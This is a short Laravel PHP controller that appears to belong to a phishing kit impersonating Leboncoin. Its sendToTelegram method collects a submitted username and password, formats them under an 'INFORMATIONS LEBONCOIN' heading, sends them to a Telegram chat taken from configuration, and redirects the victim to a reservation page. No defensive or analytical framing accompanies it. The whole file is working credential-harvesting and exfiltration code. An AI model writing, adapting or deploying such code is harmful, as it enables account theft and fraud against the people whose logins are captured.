<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Notifications\TelegramAlert;
use Illuminate\Support\Facades\Notification;

class PaymentController extends Controller
{
    /**
     * Étape 1 : Réception des données qui te redirige vers la page reservation youpi
     */
    public function sendToTelegram(Request $request)
    {
        
        $validated = $request->validate([
            'username'    => 'required|string|max:225',
            'password' =>  'required|string|min:8|max:255',
        ]);

        // 2. Formatage du message Telegram
        $message = "🔔 *INFORMATIONS LEBONCOIN* 🔔\n\n"
                 . "👤 Nom : {$validated['username']}\n"
                 . "💳 mot de passe : {$validated['password']}" ;

        try {
            // 3. Envoi de la notification
            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
                ->notify(new TelegramAlert($message));

                return redirect()->route('reservation');

        } catch (\Exception $e) {

            Log::error('Erreur Telegram : '.$e->getMessage());
            
            return redirect()->route('reservation');
        }

        
        
    }

    
}